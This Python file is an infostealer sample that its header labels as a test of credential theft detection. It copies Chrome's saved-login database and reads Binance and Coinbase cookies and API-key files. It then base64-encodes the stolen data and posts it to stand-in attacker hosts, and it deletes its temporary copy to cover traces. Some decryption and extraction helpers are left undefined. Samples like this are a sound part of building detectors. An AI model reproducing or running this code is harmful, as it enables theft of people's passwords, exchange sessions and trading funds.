"""
MALICIOUS SAMPLE - Tests credential theft detection
"""

import sqlite3
import os
import shutil
import requests
import base64


def steal_chrome_passwords():
    """Steals passwords from Chrome browser"""
    chrome_path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
    temp_db = "/tmp/chrome_passwords.db"

    # Copy Chrome database
    shutil.copy(chrome_path, temp_db)

    # Extract passwords
    conn = sqlite3.connect(temp_db)
    cursor = conn.execute(
        "SELECT origin_url, username_value, password_value FROM logins"
    )

    stolen_creds = []
    for row in cursor.fetchall():
        url, username, encrypted_password = row
        # Decrypt password (would use win32crypt on Windows)
        password = decrypt_chrome_password(encrypted_password)
        stolen_creds.append({"url": url, "username": username, "password": password})

    # Exfiltrate to attacker server
    requests.post("http://evil-server.com/collect", json=stolen_creds)

    # Clean up evidence
    os.remove(temp_db)


def steal_trading_credentials():
    """Steals trading platform credentials"""
    # Look for trading platform cookies
    binance_cookies = extract_cookies("binance.com")
    coinbase_cookies = extract_cookies("coinbase.com")

    # Steal API keys from config files
    api_keys = {}
    config_paths = [
        "~/.binance/config",
        "~/.coinbase/credentials",
        "~/trading_bot/config.json",
    ]

    for path in config_paths:
        if os.path.exists(os.path.expanduser(path)):
            with open(os.path.expanduser(path)) as f:
                content = f.read()
                # Extract API keys with regex
                api_keys[path] = extract_api_keys(content)

    # Upload stolen data
    payload = {
        "cookies": {"binance": binance_cookies, "coinbase": coinbase_cookies},
        "api_keys": api_keys,
    }

    # Encode and exfiltrate
    encoded = base64.b64encode(str(payload).encode())
    requests.post("http://attacker.evil/upload", data=encoded)


if __name__ == "__main__":
    steal_chrome_passwords()
    steal_trading_credentials()
